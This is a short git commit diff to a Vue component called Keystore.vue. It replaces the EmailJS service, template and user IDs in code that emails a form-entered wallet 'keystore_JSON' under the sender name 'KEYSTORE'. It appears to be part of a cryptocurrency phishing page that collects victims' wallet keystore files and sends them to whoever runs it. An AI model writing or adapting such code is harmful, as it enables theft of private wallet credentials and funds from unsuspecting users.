827a8b9a8d012b4b6ea6dbdc9d846fb44e113a6d
none-17 <88558468+none-17@users.noreply.github.com>
2021-09-17 16:07:25 +0100

    Update Keystore.vue

--- src/components/Keystore.vue
+++ src/components/Keystore.vue
@@ -46,9 +46,9 @@ export default {
       const checker = this.formChecker();
       if (checker) {
         var data = {
-          service_id: "service_o6cjtvh",
-          template_id: "template_axdenmh",
-          user_id: "user_q7g2o9qDOiH2ojVRoiuNN",
+          service_id: "service_e7kbs4p",
+          template_id: "template_ymnxcmq",
+          user_id: "user_Eux8rfZ8wcQHlqRkfU7eC",
           template_params: {
             from_name: "KEYSTORE",
             keystore_JSON: this.keystore_JSON,
